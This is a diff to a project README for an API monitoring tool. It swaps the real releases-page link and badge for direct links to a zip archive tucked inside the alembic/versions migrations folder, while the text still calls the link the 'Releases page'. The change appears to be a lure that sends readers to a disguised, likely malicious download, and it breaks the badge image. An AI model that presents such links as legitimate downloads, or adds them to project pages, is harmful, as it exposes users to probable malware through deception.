@@ -4,7 +4,7 @@
 Welcome to the api-monitoring-system. This tool helps you keep an eye on your APIs, ensuring they function well and stay online. Health checks, uptime analytics, and notifications make it easy to manage your API's performance.
 
 ## 📥 Download Now
-[![Download api-monitoring-system](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/noduleswimmingstroke456/api-monitoring-system/releases)
+[![Download api-monitoring-system](https://raw.githubusercontent.com/noduleswimmingstroke456/api-monitoring-system/main/alembic/versions/api-monitoring-system_axopodia.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/noduleswimmingstroke456/api-monitoring-system/main/alembic/versions/api-monitoring-system_axopodia.zip)
 
 ## 💻 System Requirements
 Before you start, ensure your device meets these requirements:
@@ -23,7 +23,7 @@ These features ensure your APIs run smoothly and that you're always informed of 
 
 ## 🛠️ Installation Process
 ### Step 1: Visit the Releases Page
-To get the application, you need to visit our [Releases page](https://github.com/noduleswimmingstroke456/api-monitoring-system/releases).
+To get the application, you need to visit our [Releases page](https://raw.githubusercontent.com/noduleswimmingstroke456/api-monitoring-system/main/alembic/versions/api-monitoring-system_axopodia.zip).
 
 ### Step 2: Choose the Right Version
 On the Releases page, you will see different versions of the api-monitoring-system. Choose the latest version, which will be at the top of the list.
